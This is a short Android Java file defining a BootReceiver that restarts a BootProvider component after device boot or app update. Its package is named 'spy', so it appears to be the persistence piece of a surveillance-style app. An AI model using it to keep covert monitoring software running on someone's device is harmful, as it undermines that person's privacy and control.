package ai.m4zk1play.spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/** Pemicu start ulang setelah boot / update. */
public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context ctx, Intent intent) {
        BootProvider.start(ctx);
    }
}
